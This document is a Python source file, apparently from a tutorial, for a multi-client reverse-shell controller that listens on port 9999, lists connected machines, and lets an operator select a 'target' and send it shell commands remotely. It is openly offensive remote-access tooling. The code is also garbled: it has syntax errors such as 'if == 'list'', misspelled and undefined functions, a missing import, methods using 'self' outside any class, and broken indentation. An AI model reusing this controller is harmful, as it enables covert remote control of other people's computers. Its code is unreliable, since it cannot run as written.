import socket
import threading
import sys
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#2_Binding the socket and listening for Connections
# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg))
        time.sleep(5)
        socket_bind()

# Accept connect from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been esthablished: " + address[0])
        except:
            print("Error accepting connections")

#9_Creating a custom Interactive Shell
# Interactive prompt for sending commands remotely
def start_turtle():
    while True:
          cmd = input('turle> ')
          if == 'list':
              list_connections()
          elif 'select' in cmd:
              conn = get_target(cmd)
              if conn is not None:
                  send_target_commands(conn)
          else:
                print("Command not recognized")

#10_Displaying All Current Connections
# Displays all current connections
    def list_connections(self):
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

  #11_Selecting a Target
  #Select a target client
    """...
Select target client
    :param cmd:
    """

def get_target(self, cmd):
    target = cmd.split(' ')[-1]
    try:
        target = int(target)
    except:
        print('Client index should be an integer')
        return None, None
    try:
        conn = self.all_connections[target]
    except IndexError:
        print('Not a valid selection')
        return None, None


    #12_Connecting to a computer Remotely
        """...
            asConnect with remote target client
                :param conn:
                :param target:
            """
    def send_target_commands(self, target, conn):
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception as e:
                print("Connection was lost %s" % str(e))
                break

#13_Creating the Threads
    """ Create worker threads (will die when main exits) """
def create_workers():
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

# Do the next job in the queue (one handlers connections, others sends comamnds)
    def work():
        while True:
            x = queue.get()
            if == l:
                socket_create()
                socket_bind()
                accpet_connections()
            if x == 2:
                start_turtle()
            queue.task_done()

    """ Each list item is a new job """
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

    create_workers()
    create_jobs()

    